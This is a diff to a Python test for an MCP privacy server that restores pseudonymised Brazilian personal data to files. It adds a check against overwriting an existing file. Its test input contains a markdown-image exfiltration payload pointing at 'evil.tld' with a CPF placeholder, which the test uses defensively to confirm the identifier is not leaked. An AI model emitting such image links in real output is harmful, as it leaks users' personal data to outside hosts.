@@ -230,12 +230,16 @@ def test_mcp_does_not_hand_real_data_back_to_the_model_by_default(tmp_path):
             saved = await client.call_tool("restaurar_para_arquivo", {
                 "texto": "Resumo de [PESSOA_1] ![x](https://evil.tld/?d=[CPF_1])", "sessao": sessao,
                 "destino": str(tmp_path / "resposta.md")})
+            again = await client.call_tool("restaurar_para_arquivo", {
+                "texto": "x", "sessao": sessao, "destino": str(tmp_path / "resposta.md")})
+            assert again.is_error and "já existe" in str(again.content)
             return names, saved
 
     names, saved = asyncio.run(run(build_server()))
     assert "restaurar_texto" not in names and {"restaurar_para_arquivo", "restaurar_arquivo"} <= names
     assert saved.structured_content["restaurados"] == 1 and "Maria" not in str(saved.structured_content)
     assert (tmp_path / "resposta.md").read_text(encoding="utf-8") == "Resumo de Maria Souza ![x](https://evil.tld/?d=[CPF_1])"
+    (tmp_path / "resposta.md").unlink()
     names, _ = asyncio.run(run(build_server(restore_text=True)))
     assert "restaurar_texto" in names
 
